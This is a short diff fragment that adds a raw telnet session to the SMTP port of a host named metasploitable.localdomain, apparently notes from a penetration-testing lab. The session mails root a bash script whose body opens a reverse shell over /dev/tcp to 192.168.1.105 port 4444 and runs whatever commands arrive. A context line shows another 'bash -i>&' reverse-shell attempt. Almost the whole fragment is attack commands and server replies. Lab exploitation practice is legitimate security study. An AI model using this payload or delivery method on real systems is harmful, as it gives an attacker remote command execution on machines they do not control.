@@ -225,3 +225,27 @@ bash -i>&
 .
 250 2.0.0 Ok: queued as 92A0FCBB9
 &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+telnet 10.30.0.235 25
+Trying 10.30.0.235...
+Connected to 10.30.0.235.
+Escape character is '^]'.
+220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
+HELO gelos.com
+MAIL FROM:<frankie@gelos.com>
+RCPT TO:<root>
+DATA
+Subject: Exploit250 metasploitable.localdomain
+250 2.1.0 Ok
+250 2.1.5 Ok
+354 End data with <CR><LF>.<CR><LF>
+#!/bin/bash
+exec 5<>/dev/tcp/192.168.1.105/4444;cat <&5 | while read line; do $line 2>&5 >&5; done
+.
+250 2.0.0 Ok: queued as 7764DCBB9
+quit
+221 2.0.0 Bye
+Connection closed by foreign host.
+
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
